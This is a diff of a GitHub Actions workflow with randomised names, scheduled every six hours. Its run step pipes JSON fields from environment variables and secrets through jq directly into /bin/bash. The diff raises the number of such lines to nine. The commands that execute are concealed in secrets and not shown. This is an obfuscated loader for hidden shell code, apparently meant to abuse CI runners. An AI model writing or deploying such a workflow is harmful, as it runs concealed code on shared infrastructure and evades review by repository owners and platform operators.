@@ -1,22 +1,25 @@
 name: guoxiuqing2678
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 3/6 * * *'
+    - cron: '29 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guoxiuqing2678
         env:
-          bsr3: ${{ secrets.bsr3 }}
+          rdda84138: ${{ secrets.rdda84138 }}
         run: |
-          echo $bsr3 | jq -r .pfjzk46192 | /bin/bash
-          echo $pav1908 | jq -r .fouce202 | /bin/bash
-          echo $tc532 | jq -r .yqe6308 | /bin/bash
-          echo $vbh278 | jq -r .xtl3975 | /bin/bash
-          echo $rynf8200 | jq -r .hut21783 | /bin/bash
+          echo $rdda84138 | jq -r .ccoc39 | /bin/bash
+          echo $jx63280 | jq -r .ikd7 | /bin/bash
+          echo $xs1076 | jq -r .wfohg01 | /bin/bash
+          echo $dy168 | jq -r .ydfns65 | /bin/bash
+          echo $pq63523 | jq -r .ac274 | /bin/bash
+          echo $j49588 | jq -r .c636 | /bin/bash
+          echo $alz8 | jq -r .o130 | /bin/bash
+          echo $tosw90103 | jq -r .erbp15 | /bin/bash
+          echo $nxjkc01478 | jq -r .zwl28244 | /bin/bash
 
